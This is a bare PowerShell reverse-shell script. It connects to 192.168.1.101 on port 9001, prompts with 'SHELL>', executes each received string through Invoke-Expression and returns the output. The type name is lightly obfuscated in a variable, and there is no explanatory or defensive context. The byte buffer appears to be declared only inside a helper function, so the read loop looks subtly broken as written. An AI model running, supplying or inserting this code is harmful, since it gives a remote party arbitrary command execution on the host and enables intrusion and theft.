$h1 = 'System.Net.Sockets.TCPClient'
$h2 = '192.168.1.101'
$p = 9001
$c = New-Object ($h1) ($h2, $p)
$s = $c.GetStream()
$w = New-Object IO.StreamWriter($s)
function z($x) {
  [byte[]]$b = 0..$c.ReceiveBufferSize | ForEach-Object {0}
  $w.Write($x + 'SHELL> ')
  $w.Flush()
}
z ''
while(($r = $s.Read($b, 0, $b.Length)) -gt 0) {
  $d = ([text.encoding]::UTF8).GetString($b, 0, $r - 1)
  $o = try {
    Invoke-Expression $d 2>&1 | Out-String
  } catch {
    $_ | Out-String
  }
  z $o
}
$w.Close()
